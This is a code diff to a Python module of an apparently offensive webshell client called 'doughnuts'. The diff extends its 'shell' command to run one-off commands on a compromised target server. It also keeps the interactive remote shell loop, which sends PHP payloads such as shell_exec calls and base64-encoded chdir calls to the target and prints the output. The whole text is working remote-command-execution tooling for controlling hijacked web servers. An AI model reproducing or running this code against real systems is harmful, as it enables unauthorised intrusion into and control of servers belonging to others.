@@ -69,13 +69,19 @@ NEW_UNIX_WORDLIST = {"common_wordlist": [
 ]}
 
 
-@alias(func_alias="s")
-def run():
+@alias(True, func_alias="s", c="command")
+def run(command: str = ""):
     """
     shell
 
-    Get a temporary shell of target system by system function.
+    Get a temporary shell of target system by system function or just run a shell command.
     """
+    if (len(command)):
+        res = send(get_system_code(command))
+        if (not res):
+            return
+        print(color.green("\nResult:\n      ") + res.r_text.strip() + "\n")
+        return
     print(color.cyan("Eenter interactive temporary shell...\n\nUse 'back' command to return doughnuts.\n"))
     res = send(f'print(shell_exec("whoami")."@".$_SERVER["SERVER_NAME"]."|".getcwd());').r_text.strip()
     prompt, pwd = res.split("|")
@@ -89,23 +95,23 @@ def run():
     try:
         while gget("loop"):
             print(prompt % pwd, end="")
-            data = readline()
-            lower_data = data.lower()
-            if (lower_data.lower() in ['exit', 'quit', 'back']):
+            command = readline()
+            lower_command = command.lower()
+            if (lower_command.lower() in ['exit', 'quit', 'back']):
                 print()
                 break
-            if (data == ''):
+            if (command == ''):
                 print()
                 continue
             b64_pwd = base64_encode(pwd)
-            if (lower_data.startswith("cd ") and len(lower_data) > 3):
-                path = base64_encode(lower_data[3:].strip())
+            if (lower_command.startswith("cd ") and len(lower_command) > 3):
+                path = base64_encode(lower_command[3:].strip())
                 res = send(f'chdir(base64_decode(\'{b64_pwd}\'));chdir(base64_decode(\'{path}\'));print(getcwd());')
                 if (not res):
                     return
                 pwd = res.r_text.strip()
             else:
-                res = send(f'chdir(base64_decode(\'{b64_pwd}\'));' + get_system_code(data))
+                res = send(f'chdir(base64_decode(\'{b64_pwd}\'));' + get_system_code(command))
                 if (not res):
                     return
                 print("\n" + res.r_text.strip() + "\n")
